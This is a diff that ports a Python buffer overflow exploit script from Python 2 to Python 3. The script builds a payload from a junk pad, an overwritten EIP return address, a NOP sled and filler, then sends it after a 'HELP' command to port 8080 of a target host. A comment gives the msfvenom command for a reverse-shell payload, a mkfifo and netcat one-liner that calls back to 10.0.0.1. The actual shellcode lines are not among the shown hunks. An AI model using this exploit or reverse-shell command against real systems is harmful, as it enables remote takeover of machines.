@@ -1,8 +1,8 @@
-#!/usr/bin/python2
+#!/usr/bin/python3
 import sys, socket
 
 if len(sys.argv) < 2:
-	print "\nUsage: " + sys.argv[0] + " <HOST>\n"
+	print("\nUsage: " + sys.argv[0] + " <HOST>\n")
 	sys.exit()
 
 
@@ -15,12 +15,12 @@ if len(sys.argv) < 2:
 # 0x08049a83
 # badchars \x00
 
-cmd = "HELP"
-junk = "A" * 60
-eip = "\x83\x9a\x04\x08"
-filler = "\x43" * 1783
-nop_sled = "\x90" * 16
-end = "\r\n"
+cmd = b"HELP"
+junk = b"A" * 60
+eip = b"\x83\x9a\x04\x08"
+filler = b"\x43" * 1783
+nop_sled = b"\x90" * 16
+end = b"\r\n"
 
 # msfvenom -p linux/x86/exec CMD="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 80 >/tmp/f" EXITFUNC=thread -b "\x00" -f python
 
@@ -44,4 +44,5 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((sys.argv[1], 8080))
 s.send(buffers)
 s.recv(1024)
+print(s)
 s.close()
